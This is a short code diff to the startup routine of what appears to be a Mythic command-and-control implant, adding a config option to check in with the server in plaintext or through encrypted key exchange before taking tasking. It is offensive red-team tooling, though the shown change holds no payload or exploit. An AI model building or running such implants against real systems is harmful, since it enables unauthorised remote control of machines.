@@ -34,10 +34,17 @@ if (!initializeC2Profile()) {
     exit(0)
 }
 
-// Perform key exchange to grab new AES key from Mythic per implant
-if (!encryptedKeyExchange())
-{
-    exit(0)
+// Perform key exchange or plaintext checkin based on configuration
+if (agentConfig.encryptedExchangeCheck) {
+    // Encrypted key exchange to grab new AES key from Mythic per implant
+    if (!encryptedKeyExchange()) {
+        exit(0)
+    }
+} else {
+    // Plaintext checkin without encryption
+    if (!plaintextCheckin()) {
+        exit(0)
+    }
 }
 
 // Begin main program execution: check kill date, sleep, get tasking from Mythic, execute tasking from Mythic, post tasking to Mythic
